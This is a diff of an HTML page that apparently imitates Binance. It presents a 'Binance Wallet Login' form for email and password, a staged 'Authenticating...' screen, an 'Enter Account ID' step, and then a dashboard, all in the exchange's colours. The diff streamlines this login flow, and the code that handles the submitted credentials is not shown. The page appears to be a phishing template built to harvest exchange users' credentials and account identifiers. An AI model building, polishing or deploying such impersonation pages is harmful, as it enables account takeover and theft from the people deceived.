@@ -80,22 +80,13 @@
       gap: 12px;
     }
 
-    .token {
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .token:hover {
-      background-color: #2b3139;
-    }
-
     .loader {
       border: 4px solid #f3ba2f;
       border-top: 4px solid transparent;
       border-radius: 50%;
       width: 40px;
       height: 40px;
-      margin: 0 auto 24px;
+      margin: 20px auto;
       animation: spin 1s linear infinite;
     }
 
@@ -105,30 +96,35 @@
     }
   </style>
 </head>
-<body>
- <!-- === PAGE 1: Sign In === -->
-<div id="page1" class="page" style="background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
-  <h2 style="font-size: 24px; font-weight: 900; margin-bottom: 20px;">Sign In</h2>
-  <input type="text" id="emailInput" placeholder="Email" style="width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 12px; background-color: #1e2329; color: #f3ba2f; border: 1px solid #f3ba2f; font-weight: 900;" />
-  <input type="password" id="passwordInput" placeholder="Password" style="width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 12px; background-color: #1e2329; color: #f3ba2f; border: 1px solid #f3ba2f; font-weight: 900;" />
-  <button onclick="signIn()" style="background-color: #f3ba2f; color: #000; padding: 12px 20px; font-weight: 900; border: none; border-radius: 12px;">Sign In</button>
-  <div id="signInStatus" style="margin-top: 10px; font-weight: 900;"></div>
+<body><onload="initApp()"><!-- Page 1: Login --><div class="page visible" id="page1">
+  <div class="form-container">
+    <h2>Binance Wallet Login</h2>
+    <input type="email" id="email" placeholder="Email" required />
+    <input type="password" id="pass" placeholder="Password" required />
+    <button onclick="submitSignin()">Confirm</button>
+  </div>
 </div>
-
-<!-- === PAGE 2: Authenticating === -->
-<div id="page2" class="page" style="display:none; background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
-  <h2 style="font-size: 24px; font-weight: 900;">Authenticating...</h2>
-  <p style="color: #fff;">Please wait while we authenticate your account.</p>
+  
+  <!-- Page 2: Processing -->
+  <div class="page" id="page2">
+  <div class="form-container">
+    <h2>Authenticating...</h2>
+    <p>Please wait...</p>
+    <button onclick="showPage(3)">Continue</button>
+  </div>
 </div>
+  
+  <!-- Page 3: Confirm ID -->
+  
+  <div class="page" id="page3">
+  <div class="form-container">
+    <h2>Enter Account ID</h2>
+    <input type="text" placeholder="Account ID" />
+    <button onclick="showPage(4)">Confirm</button>
+  </div>
 
-<!-- === PAGE 3: Account ID Confirmation === -->
-<div id="page3" class="page" style="display:none; background-color: #0b0e11; color: #f3ba2f; font-family: 'Arial Black', sans-serif; padding: 20px; min-height: 100vh;">
-  <h2 style="font-size: 24px; font-weight: 900;">Account ID Confirmation</h2>
-  <p style="color: #fff;">Please confirm your account ID.</p>
-  <button onclick="showPage('page4')" style="margin-top: 20px; background-color: #f3ba2f; color: #000; padding: 12px 20px; font-weight: 900; border: none; border-radius: 12px;">Confirm</button>
-</div>
 
-
+  
 <!-- Page 4: Homepage (Main Dashboard) -->
 <div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
   <!-- Header + Language & Currency Selectors -->
